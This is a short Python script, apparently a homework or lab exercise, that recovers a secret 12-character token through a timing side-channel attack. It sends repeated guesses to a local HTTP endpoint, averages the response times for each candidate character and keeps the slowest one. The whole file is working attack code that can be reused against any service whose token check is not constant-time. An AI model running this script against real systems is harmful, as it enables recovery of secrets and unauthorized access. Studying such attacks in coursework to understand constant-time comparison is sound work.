import requests
import time
import string


ALPHABET = string.ascii_lowercase + string.digits
TARGET_HOST = 'http://0.0.0.0:8080/hw6/ex1'
TOKEN_LENGTH = 12
NUM_PASSES = 4 # more passes ensure higher confidence (also increases time to get token; time for =4 is like 10-15min)

def avg(arr):
	return sum(arr) / len(arr)

def submit_token(host, token):
	start_time = time.time()
	r = requests.post(host, json={
		'token': token
	})
	end_time = time.time()
	elapsed_time = end_time - start_time
	return r, elapsed_time

current_token = ''
for i in range(TOKEN_LENGTH):
	char_distribution = {}	
	for pass_ in range(NUM_PASSES):
		padding_character = ALPHABET[0]
		for ch in ALPHABET:
			padding_size = TOKEN_LENGTH - i - 1
			token = current_token + ch + padding_character * padding_size
			r, passed_time = submit_token(TARGET_HOST, token)
			if r.status_code == 200:
				passed_time = 1e+100
			if ch not in char_distribution:
				char_distribution[ch] = [passed_time]
			else:
				char_distribution[ch].append(passed_time)
	best = None
	for ch, times in char_distribution.items():
		avg_time = avg(times)
		if best is None or avg_time > best[1]:
			best = (ch, avg_time)
	print(f'Char {i}:', best[0])
	current_token += best[0]

print('Token:', current_token)
if submit_token(TARGET_HOST, current_token)[0].status_code == 200:
	print('Token is correct') 
	with open('token.txt', 'w') as f:
		print(current_token, file=f)
else:
	print('Wrong token!')	
